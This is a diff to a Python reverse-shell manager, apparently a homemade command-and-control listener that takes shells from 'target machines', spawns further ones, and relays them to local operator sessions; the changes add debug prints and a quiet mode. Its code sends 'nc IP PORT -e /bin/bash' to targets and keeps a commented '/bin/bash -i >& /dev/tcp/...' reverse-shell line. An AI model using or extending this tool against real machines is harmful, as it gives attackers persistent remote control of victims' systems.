@@ -27,12 +27,14 @@ class connection:
 
     def create_new(self):
         global PORT, IP
+        print(f"SENDING: nc {IP} {PORT} -e /bin/bash & \n".encode())
         self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \n".encode())
         #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\n")
 
     def connect(self, sock):
         self.sock = sock[0]
         self.connected = True
+        print("CONNECTED", sock, self.conn)
         threading.Thread(target=self.in_stream).start()
         threading.Thread(target=self.out_stream).start()
 
@@ -42,6 +44,7 @@ class connection:
         while True:
             data = self.conn.recv(1024)
             if data:
+                print("IN", data)
                 self.sock.sendall(data)
 
 
@@ -49,6 +52,7 @@ class connection:
         while True:
             data = self.sock.recv(1024)
             if data:
+                print("OUT", data)
                 self.conn.sendall(data)
 
     
@@ -115,7 +119,7 @@ def run(quiet_mode=False):
         while True:
             connections.append(s.accept())
 
-            if connections[-1][1][0] == "127.0.0.1":    # connection from user
+            if connections[-1][1][0] == "127.0.0.1":    # connection from local user
                 ip = connections[-1][0].recv(1024).decode().split("/")[-1].replace("\n","")
                 try:
                     addresses[unique_addresses[int(ip)]].create_new()
@@ -129,9 +133,11 @@ def run(quiet_mode=False):
                 waitingl.append([ip, connections[-1]])
 
             else:                                       # connection from target machine
+                #pdb.set_trace()
                 managed_connections.append(connection(connections[-1]))
                 
                 latest = connections[-1][1][0]
+                print("CONNECTION FROM", latest)
 
                 if not latest in addresses:             # if unique address
                     id = len(unique_addresses)
@@ -147,6 +153,7 @@ def run(quiet_mode=False):
                         threading.Thread(target=run_t,args=(id,)).start()
                 
                 for w in waitingl:                      # if user is waiting to connect
+                    print("waitingl check::", managed_connections[-1], w)
                     if managed_connections[-1].addr == w[0]:
                         managed_connections[-1].connect(w[1])
                         waitingl.remove(w)
@@ -158,8 +165,8 @@ if __name__ == '__main__':
 
     # server options
     parser.add_argument('-l', '--listen', action='store_true', help="start the server")
-    parser.add_argument('-i', '--ip', help="server option - serves on the specified IP address", default="172.17.0.1")
-    parser.add_argument('-p', '--port', help="server option - serves on the specified port", default=4444)
+    parser.add_argument('-i', '--ip', help="server option - serves on the specified IP address", default=IP)
+    parser.add_argument('-p', '--port', help="server option - serves on the specified port", default=PORT)
 
     #client options
     parser.add_argument('-n', '--new-window', help="creates a new terminator window to IP#", default=0)
@@ -175,7 +182,11 @@ if __name__ == '__main__':
 
     if args.listen:
         try:
+            if args.quiet:
+                run(True)
+                quit()
             run()
+            quit()
         except KeyboardInterrupt:
             s.close()
             sys.exit(1)
